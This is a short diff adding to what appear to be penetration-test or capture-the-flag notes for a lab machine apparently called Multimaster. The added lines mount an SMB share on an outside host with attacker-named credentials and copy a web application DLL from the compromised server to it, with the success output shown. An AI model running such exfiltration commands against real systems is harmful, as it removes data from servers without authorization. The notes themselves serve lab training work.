@@ -33,3 +33,9 @@ copy C:\inetpub\wwwroot\bin\MultimasterAPI.dll \\tsclient\share\
 Copy-Item "C:\inetpub\wwwroot\bin\MultimasterAPI.dll" "\\tsclient\share\"
 
 /home/sourabh/share
+
+net use \\10.10.16.78\shared /user:hacker noobies
+The command completed successfully.
+
+C:\inetpub\wwwroot\bin>copy C:\inetpub\wwwroot\bin\MultimasterAPI.dll \\10.10.16.78\shared
+        1 file(s) copied.
